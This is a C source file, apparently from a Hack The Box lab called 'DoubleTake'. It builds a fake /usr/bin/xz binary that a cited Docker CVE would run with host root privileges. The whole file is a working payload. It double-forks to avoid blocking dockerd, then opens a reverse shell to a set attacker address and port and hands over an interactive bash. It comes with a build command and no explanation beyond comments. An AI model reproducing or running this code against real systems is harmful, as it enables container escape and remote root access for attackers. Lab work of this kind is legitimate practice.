/*
 * DoubleTake (HTB) — trojanised /usr/bin/xz
 * CVE-2026-41567: dockerd executes this from the container overlay
 * with host root privileges. Double-fork so the daemon isn't blocked.
 *
 * build:
 *   gcc -static -O2 -DLHOST='"10.10.14.95"' -DLPORT=4444 -o xz xz.c
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef LHOST
#define LHOST "127.0.0.1"
#endif
#ifndef LPORT
#define LPORT 4444
#endif

static void revshell(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) _exit(1);

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(LPORT);
    if (inet_pton(AF_INET, LHOST, &sa.sin_addr) != 1) _exit(1);
    if (connect(s, (struct sockaddr *)&sa, sizeof sa) != 0) _exit(1);

    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execl("/bin/bash", "bash", "-i", NULL);
    execl("/bin/sh",   "sh",   "-i", NULL);
    _exit(1);
}

int main(void) {
    pid_t p = fork();
    if (p != 0) return 0;   /* parent exits immediately -> dockerd continues */
    setsid();
    revshell();
    return 0;
}
